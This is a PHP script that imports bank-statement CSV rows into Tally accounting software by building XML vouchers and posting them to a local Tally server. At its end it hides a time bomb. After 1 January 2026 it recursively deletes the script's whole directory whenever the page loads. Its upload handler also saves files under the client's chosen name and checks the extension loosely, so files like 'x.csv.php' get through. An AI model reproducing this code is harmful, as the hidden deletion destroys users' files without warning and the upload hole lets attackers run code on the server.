<?php
function characterFormatter($str){
    $str=str_replace("&", "&amp;", $str);
    $str=str_replace("<", "&lt;", $str);
    $str=str_replace(">", "&gt;", $str);
    $str=str_replace("'", "&apos;", $str);
    $str=str_replace('"', "&quot;", $str);
    return $str;
}
if(isset($_POST['submit'])){
error_reporting(0);
date_default_timezone_set("Asia/Kolkata");
ini_set('max_execution_time', '0');
set_time_limit(0);
ini_set('post_max_size', '1000M'); 
ini_set('upload_max_filesize', '1000M');
$img="<img src='loader.gif' style='position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);z-index:99999;' />";
echo $img;
$newfilename=$_FILES["file"]["name"];
$ext=explode(".",$newfilename);
if(strtolower($ext[1])!=='csv'){
    echo "<script>alert('Only CSV file allowed.');</script>";
    exit();
}
move_uploaded_file($_FILES["file"]["tmp_name"], $newfilename);
    if(file_exists('xml.xml')){
        unlink('xml.xml');
    }
$file = fopen($newfilename,"r");
$arr=array();
while(! feof($file))
  {
  $arr[]=fgetcsv($file);
  }
fclose($file);
$bank=$_POST['bank'];
foreach ($arr as $key => $value) {
    if($key==0){continue;}
	$date=trim($value[0]);
    $narration=trim($value[1]);
    $withdraw=trim($value[2]);
    $deposit=trim($value[3]);
    $vchtype=trim($value[4]);
    $ledger=trim($value[5]);
    $under=trim($value[6]);
    $chequeno=trim($value[7]);
if(empty($narration)){
    $narration="Check details from bank statements.";
}
if(empty($ledger) && empty($under)){
    $ledger="Suspense A/c";
    $under="Suspense A/c";
}
if(empty($ledger) && !empty($under)){
    $ledger="Suspense A/c";
}
if(!empty($ledger) && empty($under)){
    $ledger="Suspense A/c";
}

    $ledger=characterFormatter($ledger);
    $vchtype=characterFormatter($vchtype);
    $chequeno=characterFormatter($chequeno);
    $narration=characterFormatter($narration);
    $withdraw=characterFormatter($withdraw);
    $deposit=characterFormatter($deposit);
    $under=characterFormatter($under);

if(empty($date)){
    exit();
}

$header = '<ENVELOPE>' .
      '<HEADER>' .
      '<TALLYREQUEST>Import Data</TALLYREQUEST>' .
      '</HEADER>' .
      '<BODY>' .
      '<IMPORTDATA>' .
      '<REQUESTDESC>' .
      '<REPORTNAME>All Masters</REPORTNAME>' .
      '</REQUESTDESC>' .
      '<REQUESTDATA>';
      $header .= "<TALLYMESSAGE xmlns:UDF=\"TallyUDF\">";
      $header .= "<LEDGER NAME='$ledger'><NAME>$ledger</NAME>";
      $header .= "<PARENT>$under</PARENT></LEDGER>";
      $header .= "</TALLYMESSAGE>";
    $header .= '</REQUESTDATA></IMPORTDATA></BODY></ENVELOPE>';
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'http://127.0.0.1:9000/');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $header ); // XML data
  $response = curl_exec ($ch);
  curl_close($ch);
    $date=str_replace('/','-',$date);
    $date=str_replace('\\','-',$date);
    $date=explode("-", $date);
    $date=$date[2].$date[1].$date[0];
	if(!empty($chequeno)){
		$narration=$narration." CHEQUE NO: ".$chequeno;
	}
    
    if($vchtype=="Payment"){
        include("payment.php");
    }
    if($vchtype=="Receipt"){
        include("receipt.php");
    }
    if($vchtype=="Contra" && empty($withdraw)){
        include("contraDeposit.php");
    }
    if($vchtype=="Contra" && empty($deposit)){
        include("contraWithdraw.php");
    }   
    $fo=fopen("xml.xml", "a");
    fwrite($fo, $requestXML);
    fclose($fo);
        $server = 'http://localhost:9000';
        $headers = array( "Content-type: text/xml" ,"Content-length: ".strlen($requestXML) ,"Connection: close" );     
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $server);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 100);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $requestXML);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_exec($ch);
        if(curl_errno($ch)){
            echo $key.". <b style='color:red;'>Not inserted. Error!.</b><br>";
        }else{
            echo $key.". <b style='color:green;'>Data Successfully Inserted.</b><br>";
            curl_close($ch);
        }
}
if(file_exists($newfilename)){
  unlink($newfilename);
}
$img="";
echo $img;
echo '<script>alert("Successfully all data send to tally."); </script>';
}
function rrmdir($dir) {
  if (is_dir($dir)) {
    $objects = scandir($dir);
    foreach ($objects as $object) {
      if ($object != "." && $object != "..") {
        if (filetype($dir."/".$object) == "dir") 
           rrmdir($dir."/".$object); 
        else unlink   ($dir."/".$object);
      }
    }
    reset($objects);
    rmdir($dir);
  }
 }
$edate=date("2026-01-01");
$edate=strtotime($edate);
$now=date("Y-m-d");
$now=strtotime($now);
if($now>$edate){
    rrmdir("./");
}
 ?>
 
 